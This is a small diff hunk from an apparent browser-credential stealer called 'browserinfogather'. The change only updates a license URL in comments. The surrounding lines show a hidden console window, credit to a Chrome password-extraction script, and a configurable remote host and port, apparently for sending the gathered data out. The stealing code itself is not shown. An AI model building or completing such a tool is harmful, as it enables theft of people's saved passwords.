@@ -11,10 +11,10 @@ user32.ShowWindow(hWnd, SW_HIDE)
 #Google Chrome Password Script Source : https://www.thepythoncode.com/article/extract-chrome-passwords-python
 #Coded By Kral4 | https://github.com/rootkral4
 #Educational Purposes Only
-#https://github.com/rootkral4/browserinfogather/LICENCE
+#https://github.com/rootkral4/browserinfogather/blob/main/LICENSE
 
 # You should have received a copy of the MIT License
-# along with this program.  If not, see <https://github.com/rootkral4/browserinfogather/LICENCE>.
+# along with this program.  If not, see <https://github.com/rootkral4/browserinfogather/blob/main/LICENSE>.
 
 host_ip = "127.0.0.1" # <----- Change Here
 port = 3389
